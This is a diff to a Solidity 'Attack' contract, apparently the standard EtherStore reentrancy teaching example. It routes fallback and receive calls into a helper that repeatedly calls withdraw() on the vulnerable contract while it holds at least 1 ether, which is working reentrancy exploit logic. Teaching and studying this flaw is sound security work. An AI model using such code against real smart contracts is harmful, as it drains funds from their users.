@@ -62,6 +62,16 @@ contract Attack {
 
     // Fallback is called when EtherStore sends Ether to this contract.
     fallback() external payable {
+        handleFallback();
+    }
+
+    // Receive function to handle direct transfers of Ether.
+    receive() external payable {
+        handleFallback();
+    }
+
+    // Internal function to handle fallback logic
+    function handleFallback() internal {
         if (address(reentrantVulnerable).balance >= 1 ether) {
             reentrantVulnerable.withdraw();
         }
